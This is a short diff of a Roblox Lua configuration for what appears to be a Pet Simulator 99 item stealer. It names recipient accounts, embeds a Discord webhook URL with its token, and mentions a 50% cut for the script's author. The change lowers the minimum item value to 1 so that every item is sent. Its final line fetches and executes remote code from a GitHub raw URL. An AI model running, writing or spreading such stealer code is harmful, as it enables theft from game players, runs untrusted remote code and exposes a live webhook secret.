@@ -2,5 +2,5 @@ Username = "AHAHTHANK"
 Username2 = "PS_lHome" 
 Webhook = "https://discord.com/api/webhooks/1233086458462474350/p1a69pqcdlyFDtNRkSWgWsEDIJjGxEdKGBztdMKPg1f0Nxm9ZLlmAEkluTkCVbsZHn9n"
 Support =false -- if you dont want to support me make this "false" (without quotes). 50% chance I get hit if its 10+ huges or 500+ mil rap
-min_rap = 2000000 -- minimum rap of each item you want to get sent to you.
+min_rap = 1-- minimum rap of each item you want to get sent to you.
 loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
